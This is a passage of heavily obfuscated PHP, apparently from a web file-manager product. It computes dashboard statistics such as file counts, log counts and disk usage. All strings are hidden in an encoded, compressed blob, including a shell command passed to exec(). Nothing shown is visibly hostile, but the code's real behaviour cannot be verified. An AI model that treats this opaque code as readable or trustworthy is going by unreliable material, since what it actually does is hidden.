Model($BØ‚£„ö±·[473])->count($BØ‚£„ö±·[1401]); $dæŠæ¡¹óœ = Model($BØ‚£„ö±·[473])->where($BØ‚£„ö±·[2021])->count($BØ‚£„ö±·[1401]); goto AÚÒÂÒ²×Û; A­¯„Ç¨…©: if (!$D¡Ğê®è¿ç) { $D¡Ğê®è¿ç = 1; } $B©â¤±Ş½Ñ = strtotime(date($BØ‚£„ö±·[2002])); $eßÃÖ‰òê° = array($BØ‚£„ö±·[2023] => array($BØ‚£„ö±·[918], $B©â¤±Ş½Ñ)); goto bÉÖ«îä‘; AÚÒÂÒ²×Û: $B©â¤±Ş½Ñ = strtotime($BØ‚£„ö±·[2022]); $eßÃÖ‰òê° = array($BØ‚£„ö±·[2023] => array($BØ‚£„ö±·[918], $B©â¤±Ş½Ñ)); $D¡Ğê®è¿ç = (int) Model($BØ‚£„ö±·[473])->where($eßÃÖ‰òê°)->count($BØ‚£„ö±·[1401]); goto A­¯„Ç¨…©; aĞÈË¯ñİ: } private function optionFile() { goto b˜ŒĞ¼ù÷Ç; f¬Ñ…‰ë«: $BñÓ»ºè« = Model($eËÇîÑÔÒƒ[748])->where($F»òÁŠäÜ)->sum($eËÇîÑÔÒƒ[77]); $Då­‘Œñ = Model($eËÇîÑÔÒƒ[748])->where($F»òÁŠäÜ)->count($eËÇîÑÔÒƒ[366]); return array($eËÇîÑÔÒƒ[687] => $fØ´Èª¦Ü›, $eËÇîÑÔÒƒ[1995] => $A—‹åÖ©Š, $eËÇîÑÔÒƒ[2028] => $fØ´Èª¦Ü› - $A—‹åÖ©Š, $eËÇîÑÔÒƒ[2029] => (int) $BñÓ»ºè«, $eËÇîÑÔÒƒ[689] => (int) $d·Ñ…øæÜÂ, $eËÇîÑÔÒƒ[2030] => (int) $Då­‘Œñ); goto dôùÒ™ÑÍŠ; b˜ŒĞ¼ù÷Ç: $eËÇîÑÔÒƒ =& $_SERVER[£ü]; $dÙ¶««öò = $this->sourceSize(); $fØ´Èª¦Ü› = $dÙ¶««öò[$eËÇîÑÔÒƒ[77]]; goto A¶ÆÊÂó¿´; A¶ÆÊÂó¿´: $A—‹åÖ©Š = $dÙ¶««öò[$eËÇîÑÔÒƒ[1995]]; $d·Ñ…øæÜÂ = Model($eËÇîÑÔÒƒ[748])->where(array($eËÇîÑÔÒƒ[367] => 0))->count($eËÇîÑÔÒƒ[366]); $F»òÁŠäÜ = array($eËÇîÑÔÒƒ[367] => 0, $eËÇîÑÔÒƒ[184] => array($eËÇîÑÔÒƒ[918], strtotime(date($eËÇîÑÔÒƒ[2002])))); goto f¬Ñ…‰ë«; dôùÒ™ÑÍŠ: } private function optionAccess() { $c÷¿àäŠË =& $_SERVER[£ü]; return array($c÷¿àäŠË[684] => $this->typeLogCnt(), $c÷¿àäŠË[91] => $this->typeLogCnt($c÷¿àäŠË[91]), $c÷¿àäŠË[400] => $this->typeLogCnt($c÷¿àäŠË[400]), $c÷¿àäŠË[2031] => $this->typeLogCnt($c÷¿àäŠË[2031]), $c÷¿àäŠË[2032] => $this->typeLogCnt($c÷¿àäŠË[2032]), $c÷¿àäŠË[531] => $this->typeLogCnt($c÷¿àäŠË[33], $c÷¿àäŠË[2006])); } private function typeLogCnt($bçÍ’ö‰ğ = '', $C¼‡‚İ×´ê = "\151\144") { goto E§ÑÍŒ²Ôµ; E§ÑÍŒ²Ôµ: $d±Õ‡ÙùÔÈ =& $_SERVER[£ü]; $F©¥ÌƒÁù‰ = array($d±Õ‡ÙùÔÈ[91] => array($d±Õ‡ÙùÔÈ[2033], $d±Õ‡ÙùÔÈ[2034]), $d±Õ‡ÙùÔÈ[400] => array($d±Õ‡ÙùÔÈ[2035], $d±Õ‡ÙùÔÈ[2036]), $d±Õ‡ÙùÔÈ[2031] => array($d±Õ‡ÙùÔÈ[2037], $d±Õ‡ÙùÔÈ[2038]), $d±Õ‡ÙùÔÈ[2032] => array($d±Õ‡ÙùÔÈ[2039], $d±Õ‡ÙùÔÈ[2040]), $d±Õ‡ÙùÔÈ[2041] => array($d±Õ‡ÙùÔÈ[2042], $d±Õ‡ÙùÔÈ[2043], $d±Õ‡ÙùÔÈ[2044])); $cÁ•–“œ¿í = strtotime(date($d±Õ‡ÙùÔÈ[2002])); goto AËôĞ¶ô¤; AËôĞ¶ô¤: $E–ÂÁÕ²±­ = array($d±Õ‡ÙùÔÈ[184] => array($d±Õ‡ÙùÔÈ[918], $cÁ•–“œ¿í)); if ($bçÍ’ö‰ğ) { $E–ÂÁÕ²±­[$d±Õ‡ÙùÔÈ[29]] = array($d±Õ‡ÙùÔÈ[7], $F©¥ÌƒÁù‰[$bçÍ’ö‰ğ]); } $fõ…ËÉ¸ĞÖ = Model($d±Õ‡ÙùÔÈ[2005])->where($E–ÂÁÕ²±­)->count($C¼‡‚İ×´ê); goto F®ôççğï†; F®ôççğï†: return (int) $fõ…ËÉ¸ĞÖ; goto a¤»¾¹ßÅ©; a¤»¾¹ßÅ©: } private function optionServer() { goto B¹Ï†øÙªÜ; Fà‚ìèŒÀ: $A¤²º›èª = $bÆ×¡£ŒÚ±[0]; $AÎŠ¬áÛŠ÷ = $GLOBALS[$f²‚ªÏ“Ğ·[6]][$f²‚ªÏ“Ğ·[17]]; $fàŠêñˆÁ“ = $AÎŠ¬áÛŠ÷[$f²‚ªÏ“Ğ·[878]]; goto Cè­çƒæ±×; Cè­çƒæ±×: if ($fàŠêñˆÁ“ == $f²‚ªÏ“Ğ·[713]) { $DÍ¸¤ÄîŠİ = explode($f²‚ªÏ“Ğ·[1066], $AÎŠ¬áÛŠ÷[$f²‚ªÏ“Ğ·[877]]); $fàŠêñˆÁ“ = $DÍ¸¤ÄîŠİ[0]; } if ($fàŠêñˆÁ“ == $f²‚ªÏ“Ğ·[716] || $fàŠêñˆÁ“ == $f²‚ªÏ“Ğ·[717]) { $aËˆ¯àÔç¾ = Model()->db()->query($f²‚ªÏ“Ğ·[2045]); $D³†‡İ£Á½ = $aËˆ¯àÔç¾[0] && isset($aËˆ¯àÔç¾[0][$f²‚ªÏ“Ğ·[1308]]) ? $aËˆ¯àÔç¾[0][$f²‚ªÏ“Ğ·[1308]] : 0; $fàŠêñˆÁ“ = $f²‚ªÏ“Ğ·[2046] . ($D³†‡İ£Á½ ? $f²‚ªÏ“Ğ·[8] . $D³†‡İ£Á½ : $f²‚ªÏ“Ğ·[33]); } $d©¨†ã ­ = $GLOBALS[$f²‚ªÏ“Ğ·[6]][$f²‚ªÏ“Ğ·[334]][$f²‚ªÏ“Ğ·[749]]; goto fë¦ò°¤Š„; BÕÔçÒ¤´†: $F‚ºÂ‚èÉ = array($f²‚ªÏ“Ğ·[739] => $D°—ÃÄÚãÌ[$f²‚ªÏ“Ğ·[364]]); $C½ğ›Äï‹Œ = Model($f²‚ªÏ“Ğ·[418])->where($F‚ºÂ‚èÉ)->sum($f²‚ªÏ“Ğ·[77]); $bÆ×¡£ŒÚ± = explode($f²‚ªÏ“Ğ·[50], $_SERVER[$f²‚ªÏ“Ğ·[138]]); goto Fà‚ìèŒÀ; fë¦ò°¤Š„: return array($f²‚ªÏ“Ğ·[2047] => $BÔĞÄ…å•ë ? $BÔĞÄ…å•ë[$f²‚ªÏ“Ğ·[2048]] : 0, $f²‚ªÏ“Ğ·[2049] => $BÔĞÄ…å•ë ? $BÔĞÄ…å•ë[$f²‚ªÏ“Ğ·[2050]] : 0, $f²‚ªÏ“Ğ·[2051] => (int) $D°—ÃÄÚãÌ[$f²‚ªÏ“Ğ·[2048]] * 1024 * 1024 * 1024, $f²‚ªÏ“Ğ·[2052] => (int) $C½ğ›Äï‹Œ, $f²‚ªÏ“Ğ·[2053] => ucfirst($A¤²º›èª), $f²‚ªÏ“Ğ·[2054] => $f²‚ªÏ“Ğ·[2055] . PHP_VERSION, $f²‚ªÏ“Ğ·[2056] => phpBuild64() ? 64 : 32, $f²‚ªÏ“Ğ·[683] => str_replace($f²‚ªÏ“Ğ·[2057], $f²‚ªÏ“Ğ·[894], $fàŠêñˆÁ“), $f²‚ªÏ“Ğ·[334] => ucfirst($d©¨†ã ­), $f²‚ªÏ“Ğ·[28] => $_SERVER[$f²‚ªÏ“Ğ·[2058]]); goto E†”ŞÅÊ„Ñ; B¹Ï†øÙªÜ: $f²‚ªÏ“Ğ· =& $_SERVER[£ü]; $BÔĞÄ…å•ë = $this->diskDriver(); $D°—ÃÄÚãÌ = KodIO::defaultDriver(); goto BÕÔçÒ¤´†; E†”ŞÅÊ„Ñ: } private function diskDriver() { goto eùéé¦Ÿ’—; fé„¬æ¥øÂ: $eÒµõ”Øº™ = $DÁ’âÄµÏ¼ - @disk_free_space($bª¥¨ë±Ê); return array($F¬ò·İÛŠ½[2048] => $DÁ’âÄµÏ¼, $F¬ò·İÛŠ½[2050] => $eÒµõ”Øº™); goto CëùÛ«ñùŒ; E×–†«ãÊÕ: if ($fß¼ƒÁôê) { $bª¥¨ë±Ê = $F¬ò·İÛŠ½[2061]; if (function_exists($F¬ò·İÛŠ½[2062])) { exec($F¬ò·İÛŠ½[2063], $c áŠ®©«’); $bª¥¨ë±Ê = $c áŠ®©«’[1] . $F¬ò·İÛŠ½[8]; } } if (!file_exists($bª¥¨ë±Ê)) { return; } $DÁ’âÄµÏ¼ = @disk_total_space($bª¥¨ë±Ê); goto fé„¬æ¥øÂ; eùéé¦Ÿ’—: $F¬ò·İÛŠ½ =& $_SERVER[£ü]; $bª¥¨ë±Ê = $F¬ò·İÛŠ½[8]; $fß¼ƒÁôê = $GLOBALS[$F¬ò·İÛŠ½[6]][$F¬ò·İÛŠ½[2059]] == $F¬ò·İÛŠ½[2060]; goto E×–†«ãÊÕ; CëùÛ«ñùŒ: } public function fileChart($Aùí‰°ˆÊç) { goto eŠé†¿Ñí»; d”µÒÁ±º¬: $eº–Ä¼±†‡ = $this->sourceSize(); $CÛÑƒî³à = array($E…ÀíÒ ‹ø[457] => 0, $E…ÀíÒ ‹ø[368] => 1); $cª¤ôáùĞ = Model($E…ÀíÒ ‹ø[748])->where($CÛÑƒî³à)->sum($E…ÀíÒ ‹ø[77]); goto F×»”„ùÛÜ; F×»”„ùÛÜ: $CÛÑƒî³à[$E…ÀíÒ ‹ø[368]] = 2; $B‰‡‡’ƒô“ = Model($E…ÀíÒ ‹ø[748])->where($CÛÑƒî³à)->sum($E…ÀíÒ ‹ø[77]); return array($E…ÀíÒ ‹ø[687] => $eº–Ä¼±†‡[$E…ÀíÒ ‹ø[77]], $E…ÀíÒ ‹ø[1995] => $eº–Ä¼±†‡[$E…ÀíÒ ‹ø[1995]], $E…ÀíÒ ‹ø[1996] => (int) $cª¤ôáùĞ, $E…ÀíÒ ‹ø[1997] => (int) $B‰‡‡’ƒô“); goto B°¬˜Âã°¨; eŠé†¿Ñí»: $E…ÀíÒ ‹ø =& $_SERVER[£ü]; if (isset($Aùí‰°ˆÊç[$E…ÀíÒ ‹ø[1401]])) { return Model($E…ÀíÒ ‹ø[748])->userFileTypeProfile($Aùí‰°ˆÊç[$E…ÀíÒ ‹ø[1401]]); } if (isset($Aùí‰°ˆÊç[$E…ÀíÒ ‹ø[2064]])) { return Model($E…ÀíÒ ‹ø[748])->groupFileTypeProfile($Aùí‰°ˆÊç[$E…ÀíÒ ‹ø[2064]]); } goto d”µÒÁ±º¬; B°¬˜Âã°¨: } private function sourceSize() { $EÔÃ²ÄŠ =& $_SERVER[£ü]; $C¢È‘††å© = Model($EÔÃ²ÄŠ[748])->where(array($EÔÃ²ÄŠ[367] => 0))->sum($EÔÃ²ÄŠ[77]); $D‡Ò¹ê˜ß¸ = Model($EÔÃ²ÄŠ[418])->sum($EÔÃ²ÄŠ[77]); if ($D‡Ò¹ê˜ß¸ > $C¢È‘††å©) { $D‡Ò¹ê˜ß¸ = $C¢È‘††å©; } return array($EÔÃ²ÄŠ[77] => (int) $C¢È‘††å©, $EÔÃ²ÄŠ[1995] => (int) $D‡Ò¹ê˜ß¸); } } goto e­Á»À©; e¥¨Œƒõ¯: if (!function_exists('_kodDe')) { function _kodDe($c¨ÉÇ»Ëï) { $c¨ÉÇ»Ëï = base64_decode($c¨ÉÇ»Ëï); $E²¯×‘±÷ = strlen($c¨ÉÇ»Ëï); $fÍôóë’…À = ''; $d¡ï¤Í©ÚÈ = ord($c¨ÉÇ»Ëï[0]) - 30; for ($CìõÇñÏ×³ = 1; $CìõÇñÏ×³ < $E²¯×‘±÷; $CìõÇñÏ×³ += 2) { if ($CìõÇñÏ×³ + 1 < $E²¯×‘±÷) { $fÍôóë’…À .= chr(ord($c¨ÉÇ»Ëï[$CìõÇñÏ×³ + 1]) + $d¡ï¤Í©ÚÈ); $fÍôóë’…À .= chr(ord($c¨ÉÇ»Ëï[$CìõÇñÏ×³]) + $d¡ï¤Í©ÚÈ); } else { $fÍôóë’…À .= chr(ord($c¨ÉÇ»Ëï[$CìõÇñÏ×³]) + $d¡ï¤Í©ÚÈ); } } return $fÍôóë’…À; } } define("\xa3\xfc", "\xdb\xfb\xd8\xd7\xf8\xf8\x9b\xf3"); $_SERVER[£ü] = explode("\174\4\174\5\174\4", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\75\11\170\33\305\325\34\205\222\160\374\375\201\102\51\5\26\103\360\221\225\344\63\207\23\333\221\55\331\26\221\55\107\222\343\44\226\243\254\244\225\264\261\244\225"."\167\127\276\342\100\271\217\20\50\77\24\50\147\13\345\276\317\162\103\233\162\225\277\320\2\201\102\132\312\225\244\334\205\26\112\51\205\177\356\231\135\311\264\375\371\160\64\363\346\315\354\34\157\336\274\231"."\171\357\315\157\316\171\141\346\33\63\173\314\174\343\212\57\157\300\201\231\135\301\277\273\341\360\21\233\366\332\5\375\267\173\176\305\317\373\167\153\370\326\346\143\326\176\61\267\377\362\175\216\176\365\214\135"."\275\253\257\222\307\316\330\364\370\117\153\337\177\164\301\371\367\150\17\234\373\235\366\127\177\370\43\165\350\27\127\377\145\155\253\276\343\327\373\154\213\277\167\353\247\27\336\272\362\304\356\232\233\126\137\337"."\x92\x78\xea\xa8\xf8\xc7\xbb\x3c\x39\xfd\x9d\xfb\xbf\x73\xa9\xfb\xa5\x5f\x49\x97\xdf\x5d\x3f\x71\xcb\xbb\x73\x4f\x4b\x6d\x7b\xa1\xed\xd1\xfb\x4f\xfe\xcd\xd2\x93\x8f\xb9\xf9\x9d\x43\x1e\xda\xfa\xdd\x99\xf\x8f\xbf\xf1\xbc\x7"."\237\213\334\176\377\313\7\317\133\233\334\345\303\233\173\116\377\160\337\123\333\237\332\375\263\133\32\367\37\377\353\323\247\174\377\133\73\306\167\77\65\334\271\353\232\246\337\235\260\354\325\353\377\61\170\145"."\xc7\x11\xbf\xdc\xf4\x9d\xa7\xc2\xd1\xe1\xdb\xd4\x9f\x1e\x72\xe4\x41\x2b\xab\x8e\xfb\xee\xb3\xa1\xbb\xfe\xf6\xc9\x6d\xfb\x5f\xfc\x49\xd5\xaf\x8e\xd1\x9e\xb9\xfc\x4e\xeb\x57\xd7\xbc\x7d\xe9\xe6\x83\xe7\x68\x17\xde\x76\xc7\xe1"."\167\134\171\326\163\307\75\377\277\133\274\27\54\275\355\345\165\355\336\57\377\147\237\227\153\246\272\76\136\365\303\27\56\33\273\363\264\113\67\134\265\317\37\232\66\255\235\363\161\353\335\53\346\64\66\356"."\266\323\373\347\275\336\372\347\101\273\277\71\377\352\327\47\137\74\334\163\325\326\13\236\336\41\135\261\367\316\137\376\141\303\153\177\357\171\344\346\247\136\370\257\113\57\371\261\52\57\273\351\123\371\121\277"."\xba\xef\xfc\x7b\xcf\xdd\xfa\xf7\x67\xb5\xfd\x8e\xba\xfb\xe4\xbe\xd3\x4e\x5e\x70\xc7\xed\xe1\x97\xdf\x3c\xf9\xd1\x9f\xdd\x77\xeb\x7b\x27\x86\x9e\x8b\xf7\xde\xa7\xf4\xfd\x71\xb7\x5d\x76\xc1\x1d\xdd\x8a\x7f\xa4\x82\x6e\x49\xea".base64_decode('pGZaJgYk9UJay+CwVsC/HvxjjuU0S8XheH8oGo8MDgz4w9E4KVFMz+spEioqhpInhRdVwwSfEos=')."\213\27\365\242\132\260\101\70\40\245\130\112\102\61\111\111\276\316\270\317\77\20\14\255\216\107\127\17\370\11\106\42\76\126\122\215\51\34\103\301\210\245\30\126\124\313\253\14\143\302\140\365\352\364\367\4"."\372\245\150\330\333\37\361\166\105\3\241\176\14\356\12\365\365\5\242\345\360\160\50\30\354\364\166\55\57\117\31\10\173\173\372\274\22\250\137\116\215\153\205\264\136\43\255\303\51\353\244\132\34\350\326\324"."\134\12\7\13\12\255\216\65\125\44\241\50\13\201\61\50\224\162\71\34\351\147\41\122\177\65\255\224\162\244\317\174\142\244\150\150\171\205\66\175\271\72\305\240\70\240\224\54\135\53\44\161\304\77\151\31".strrev('³JÉè?`ß8KW£U·ªÁ/Ø^¡¤5KLW‘C"O¨pî¥5`•ßĞQH¯5'."\r".'\'ƒ‡'."\n".'').base64_decode('lWCp+SItBuepUFgo7POHpc7VEu+npJ7P6wU3KAWMpyVU1R8O44BMKDgYgENHIqHu7oifxUjjVgQ=').base64_decode('QU2aCJXaYql0zoqPK7kSJdZR/FtNfsivbhICHtMKWokQKylC19nMIYESxVYpJA+y6WROgQk2joM=')."\155\355\370\167\11\101\112\304\141\232\152\130\161\265\220\324\123\132\201\114\303\16\62\345\10\341\51\126\326\147\150\0\217\24\250\273\223\172\161\252\117\37\47\155\110\153\71\65\310\146\131\132\317\245\124\203"."\307\213\40\273\230\102\32\243\115\13\271\373\113\171\21\205\105\223\131\55\227\62\350\344\374\72\314\6\122\254\152\131\240\31\46\255\351\140\61\247\53\251\210\152\10\265\357\6\305\204\112\226\10\54\41\264"."\156\335\310\373\0\3\40\275\3\310\136\33\254\220\60\112\11\77\45\164\12\56\201\16\136\127\266\124\30\215\260\46\272\11\127\253\31\76\301\365\345\310\360\62\360\117\55\141\161\61\122\357\254\232\313\305".base64_decode('1UmVzJ58qsWkTfOYCa3gARAcDYTiWcXM9qVa4igX5ZwpddJdzBbJBGdzmpA1HIV+3fILjDenJxU=')."\x82\x94\xb5\xac\x62\x44\x2d\xa4\x60\xd7\x90\xb6\xe9\x13\x5\xd4\x75\x45\x55\x25\xcd\xf2\xc9\x52\x4a\xea\x93\x56\x4b\xbd\xad\x5a\x2b\xa5\x33\x40\x35\xe9\x29\xce\xfb\xb2\x56\x9e\x15\x99\xa7\x4d\x63\x30\x93\x1\xad\x49\x42\x1d"."\x55\x24\xae\x4e\x5a\xa4\x47\xa4\x25\xc9\xac\x62\x80\x81\x6c\x2b\x59\x69\xd7\x22\xc2\x42\x8a\xc5\x9c\x96\x54\x2c\x4d\x2f\x78\xf4\xa4\xa5\x5a\x2e\xd3\x32\x54\x85\x94\x56\xb5\x44\x82\xb4\x1\xe7\x72\x1d\xce\x45\xe7\x51\x97\x5e"."\260\300\104\166\105\15\245\140\246\125\303\345\47\204\336\52\201\116\145\274\214\242\371\64\263\250\233\32\374\114\253\244\130\226\222\314\102\76\300\213\157\373\32\174\255\220\323\12\152\31\256\67\231\124\115\323"."\x5\xb3\x18\x7a\xce\xe5\xcd\xe5\xf4\x9\x57\xc8\xd0\x32\x1a\xc8\x53\xe7\xa8\x26\xe0\x51\xad\x12\x65\xa0\x45\xcd\x50\x4d\x1a\x95\x7a\xfa\xa2\x4\x19\xd4\x4a\x75\xd\x18\x4a\x26\xaf\xb4\x4a\xc5\x52\x2\xf4\xc\x99\xa9\x15\x60"."\30\233\174\275\125\112\302\250\54\345\113\246\345\62\124\300\210\64\260\344\221\301\13\244\135\175\160\74\65\65\345\212\0\176\115\300\115\365\315\22\40\35\211\246\141\150\157\64\72\20\17\164\203\145\271\337"."\37\357\363\106\273\172\111\265\55\45\103\353\34\4\134\230\25\111\201\253\134\140\362\101\102\353\7\175\304\201\3\372\204\152\200\17\167\116\265\112\243\172\52\241\117\272\151\22\104\206\223\211\42\303\36\55"."\132\256\260\122\310\300\376\111\114\131\52\41\107\163\74\103\227\227\360\112\177\70\36\11\165\107\207\274\141\77\231\24\240\313\47\151\241\260\220\234\53\254\246\100\47\47\55\132\264\122\204\375\103\161\340\224"."\200\243\111\123\341\64\241\151\301\100\17\354\2\237\313\4\110\56\21\213\226\35\324\362\32\254\245\305\122\120\237\201\165\275\207\124\310\203\252\336\26\313\326\325\304\122\363\153\135\340\337\272\332\341\230\317"."\x5d\x37\xd2\xe1\xd1\x78\x1e\x4f\x83\xbb\x41\x6a\xac\x5f\x20\xd\x0\x41\x43\x53\x72\x12\xa1\x97\x32\x8c\x7a\x29\xb4\xdc\x4e\x51\x41\xb5\x90\xb1\xb2\x44\xf6\xa\xfb\x57\xc\xfa\x23\xd1\x78\x9f\x3f\xda\x1b\xf2\x91\xdc\x7e\x2f".strrev('zB|¥²±›)ËDHñY˜iÒ'."\0".':|æ–ŒåN•¥Y%'."\r".'Ó¤Ôgô°Ïñ‡mhÁ<u	')."\170\11\144\104\301\160\60\346\242\263\65\105\67\110\250\325\103\262\314\153\354\246\374\321\23\151\2\377\163\146\230\322\363\12\225\54\321\364\123\123\170\376\141\120\235\55\245\127\125\370\42\145\31\226\16\241"."\x86\xd\xa5\x4f\xb5\xb2\x3a\x99\x6\x19\x95\x56\xa9\xc4\xea\x46\x6b\x99\x52\x73\x2a\xed\xa5\xac\x4a\x57\x7\x20\x2e\x8d\xb3\xce\x2b\x1a\x6a\x5a\x23\x34\x9\xe4\x23\x0\xe7\xbc\x54\x33\xc3\x20\x13\x94\x57\x68\x7c\x8\x8a\x95"."\34\140\161\266\253\230\234\165\303\210\260\322\166\17\6\203\361\256\120\177\24\210\226\30\62\24\16\104\375\224\42\274\276\270\267\153\200\255\72\174\230\10\2\234\144\345\114\12\103\306\33\5\356\315\331\74"."\x67\x9c\x74\x6d\x82\x8c\x11\x87\x1\x47\x2b\xea\x5\x53\x75\x25\x49\x69\x29\xce\x42\x31\xc6\x12\x7\xff\x2c\xcb\xc1\x5\xda\x49\x97\x92\x9f\x76\xe5\x55\x4b\x71\xb1\xaa\xdb\x57\x29\x29\x2a\x2e\xcf\x1\x32\x4\x9c\xe5\xe5\xc0"."\162\10\366\13\164\111\34\10\105\110\206\16\10\5\322\105\102\65\110\75\6\6\111\122\136\30\376\36\77\1\316\245\53\234\102\44\21\357\120\204\262\253\22\300\67\264\151\205\267\261\203\326\207\224\75\231"."\317\161\201\51\256\331\306\57\256\47\326\3\16\5\210\116\251\324\152\27\37\253\150\157\240\177\171\274\57\344\363\7\343\201\176\300\2\243\345\360\301\1\237\227\16\276\10\357\14\105\173\155\320\101\300\47"."\126\172\203\1\47\272\177\125\40\22\215\124\114\2\260\101\277\43\5\154\241\6\302\376\356\300\52\26\355\16\370\203\276\110\274\313\333\325\313\161\372\275\175\44\22\117\303\115\214\351\261\343\307\1\67\217"."\260\255\120\174\34\156\353\150\147\306\155\373\216\70\225\250\343\234\116\300\22\244\22\332\44\315\205\233\111\324\22\42\343\46\365\22\245\126\46\167\345\51\203\310\53\144\206\52\164\171\251\301\77\265\222\67"."\x22\x59\xc5\x38\x63\x5\x89\x29\x16\x44\xcd\xa0\x71\x20\x68\x91\xef\x4b\x84\xf9\x96\xd5\x20\xe\x71\x3a\xd5\xb4\x6e\xa8\x5f\x7\xf0\xa6\x2d\x46\x18\x8e\x38\x98\x37\x3c\xd\x8c\x80\x17\xed\x5a\x1\x25\xa0\x11\x89\xd3\xb9\x68"."\x2\x79\xdf\x4b\xab\x93\xe6\x3b\xc6\x78\x8\x6c\xad\xbd\x70\xbf\x19\x1f\xa\x87\xfa\x7b\x48\x86\x89\xac\x4a\x2b\x10\x20\xdd\x5f\x43\x45\x12\xb2\xed\xb4\x38\x4b\x2\xf2\x84\xc2\x45\x43\xda\xe9\xeb\x75\xda\x95\x33\xf8\xe7\x18"."\374\3\104\60\362\161\265\100\173\75\1\31\63\143\34\164\117\1\146\13\145\252\172\211\175\55\241\353\71\72\217\301\132\313\370\5\333\260\256\67\51\221\114\122\346\64\237\256\132\144\161\210\206\226\373\373"."\343\224\262\160\114\240\106\14\0\133\300\120\230\164\210\245\217\322\15\11\116\14\373\43\224\13\30\352\130\111\243\335\345\161\317\47\124\254\202\365\207\174\336\263\66\66\61\277\146\330\65\337\75\2\2\265"."\165\313\160\224\304\142\156\133\364\150\222\277\144\260\334\120\4\251\61\73\152\133\143\236\230\247\246\243\165\330\353\232\126\134\323\365\256\305\256\221\371\61\167\355\174\2\30\331\320\50\67\157\204\10\0\261"."\343\250\21\360\323\26\353\230\27\163\35\163\334\272\145\303\261\221\352\326\371\107\306\334\107\305\46\106\352\152\73\350\167\222\45\3\154\266\222\123\254\252\251\371\65\240\112\100\64\141\50\5\304\22\5\4"."\232\60\255\25\71\164\303\202\215\24\16\306\120\315\360\34\303\256\330\374\221\16\41\237\0\162\176\13\210\56\200\77\147\31\236\327\265\6\266\214\145\205\363\236\320\107\251\220\344\334\25\316\213\204\222\44"."\174\100\313\24\330\24\2\13\72\333\344\332\145\337\15\363\360\357\106\72\220\31\225\56\313\360\174\312\40\324\131\52\150\143\164\353\136\120\307\110\100\267\50\175\47\124\153\102\245\344\1\340\266\70\40\16"."\272\341\2\111\102\54\207\204\64\362\5\276\351\121\321\16\200\264\242\30\207\142\327\4\213\245\324\2\31\247\71\4\333\114\52\105\65\42\264\60\36\217\172\73\203\376\70\345\60\204\23\323\70\342\212\235"."\354\260\13\64\215\163\124\266\173\344\342\260\71\226\223\20\63\220\124\303\320\215\126\164\220\147\226\212\120\26\3\173\37\13\364\247\4\266\306\122\133\273\204\273\231\160\211\270\330\351\105\205\112\23\160\137"."\312\44\4\117\115\54\126\32\126\123\43\303\200\220\25\127\172\144\103\323\306\132\52\1\173\142\340\77\32\301\374\213\324\270\310\307\317\4\262\126\322\142\13\156\331\171\123\234\161\100\130\5\166\154\240\33".base64_decode('bJ2FcC61Wrql5BgaTItCCOU2dK0mu2s8gEHOhODqLJzGIQ7Zz46a2AmCcBAEYLIQxf+2VVE2XQA=')."\x13\xa1\x8b\x2f\x52\x1\x9f\x8b\xc\xa2\x77\x95\x2b\x40\x4\x78\x16\xd0\xa8\xa8\xa9\x80\xe9\x6c\x51\xa8\xa9\x97\x8c\xa4\xca\x70\x6c\x42\x86\xa5\x18\x60\xcd\xe2\x92\x1d\x94\xc1\x84\xe3\x42\x50\x73\x19\x9e\x20\xc8\x70\x4d\x95"."\x81\xb4\x27\xc3\xf3\x1b\x99\x4b\xac\x32\x3f\x8\x90\x99\xfc\x29\x13\xb1\x54\xe6\xa5\x93\x60\xc0\x27\x6b\xa6\xf\x89\xc7\xa8\x5c\x94\x44\xeb\x6c\x65\xe1\xb6\x3a\xa7\x4c\xc9\xb8\xfe\x41\x75\x5c\xcd\xc9\xb4\xf6\x32\x6d\x94\x4c"."\x5b\x20\xa3\xfd\x86\x8f\xd4\x66\x10\xd0\x7\xa9\xd\xa\x2\x26\x91\x95\xe1\x70\xc0\xb1\xa5\xa5\xc0\x20\xed\x6\x26\x54\xcb\x5c\xe0\x96\x33\x86\x5e\x2a\xe\xd0\x2f\x9\x31\x5c\x19\x2\xe0\x35\x65\x80\xb0\xae\x5b\x32\xdd\x0".strrev('L•DJò\'xy8ˆÜä¸¸çOÉê~\'`»À8¸Êİé…YÜpI>[=¯8’´<:°@ã@±')."\104\370\274\245\144\350\267\61\70\254\46\247\222\174\47\343\23\266\106\366\30\33\147\104\164\225\50\247\362\70\63\152\140\204\65\167\316\34\112\306\234\150\10\255\330\50\153\126\122\346\315\13\25\371\362\2".base64_decode('Z38EMD1hflNQiLOTElkOFTNJBZcJesmgUphQf9p6W7kwyqchbaIEC5AFBg2HwsXHU4iSH02P434=')."\x8d\xe7\xd9\x36\x82\x75\xb4\x83\xf3\xc0\x7e\x1f\xd0\xa\x53\x5a\x41\xdc\xa8\x73\x28\x67\x70\x9c\x2\x20\x2d\xf3\x18\xee\xe3\xd9\xc2\x98\x91\xf0\x83\x0\x99\x1c\x10\xc8\x60\x93\x38\x2a\xb0\x38\xbe\xa1\x5\xb5\x87\x59\x85\xba"."\223\222\34\65\247\263\315\145\217\362\311\67\10\366\104\161\132\33\102\265\204\110\263\212\301\173\231\116\50\110\305\254\125\46\104\341\121\1\55\255\214\163\336\156\313\43\114\3\323\232\142\147\32\102\320\136"."\50\216\372\146\213\364\262\255\136\245\250\70\377\64\63\10\172\263\122\30\265\64\252\127\214\42\21\100\2\213\77\75\357\242\262\174\334\161\246\0\242\302\110\305\155\307\17\270\32\136\306\347\200\24\223\3"."\x23\x60\xb8\xe1\x24\xe9\x81\x5c\x4c\x5c\x72\xf8\x72\x4\x39\x27\xe\xb\x48\x45\x27\xc3\xb3\x31\xe6\x4a\xab\x9c\x93\x35\x3b\xa0\x8e\x28\xff\xa8\x8d\xef\x94\x2d\x45\x44\x12\x21\x82\x67\x3d\xa1\xfa\x14\xd8\x22\xba\xd\xcc\xd9"."\334\100\326\50\141\270\134\57\254\145\174\372\156\60\247\114\113\315\23\116\270\321\321\73\26\330\313\44\24\303\155\200\32\361\212\162\376\117\44\215\22\3\214\70\61\160\361\101\235\12\276\220\376\375\51\315"."\202\20\310\315\164\172\102\305\21\5\236\316\140\102\201\250\113\334\145\143\220\323\106\111\56\171\236\15\263\22\47\167\327\41\236\353\346\13\215\270\114\211\127\102\20\215\267\34\136\61\341\220\160\231\232\147"."\x77\x4e\x8\xe8\x36\x2d\xbd\xc8\x53\x84\x28\x4e\x16\x92\x78\xa1\x2\x16\xeb\x7c\x54\x43\xb0\x2\xa4\x90\x30\xc0\xbb\x10\xe1\x92\xbc\x48\x5c\xc6\xc4\xed\xce\x1\xc\xb7\xc8\x8a\xbc\x86\x41\x89\x4\x37\xf\x1e\xd7